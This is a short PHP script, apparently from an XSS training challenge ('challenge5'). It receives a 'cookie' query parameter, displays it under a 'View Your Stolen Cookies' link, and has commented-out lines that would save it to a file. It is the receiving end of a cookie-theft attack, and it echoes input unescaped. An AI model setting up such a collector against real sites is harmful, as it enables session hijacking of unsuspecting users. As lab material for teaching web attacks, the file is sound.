<?php

if( array_key_exists( "cookie", $_GET ) && $_GET[ 'cookie' ] != NULL ) {
        $cookie_str = $_GET[ 'cookie' ];
	$ret_html = "<html>";
	$ret_html .= "<li>Received Cookie: ".$cookie_str."</li>";
	$ret_html .= "<br><a href='viewCookies.php'>View Your Stolen Cookies</a>";
	$ret_html .= "<br><br>Stuck on this page? Can't get back to the comments page?";
	$ret_html .= "<br><a href='/?clear=True'>Click here</a> to clear your comments :)";
	$ret_html .= "</html>";
	echo $ret_html;
        //$handle = fopen("/var/www/challenge5/html/cookie.txt", "w");
        //$cky = "\nRecieved Cookie:<br>".$cookie_str . "\n";
        //echo $cky;
        //fwrite($handle, $cky);
        //fclose($handle);
       
} else {
        exit("<br>you didn't send a cookie...");
}

?>
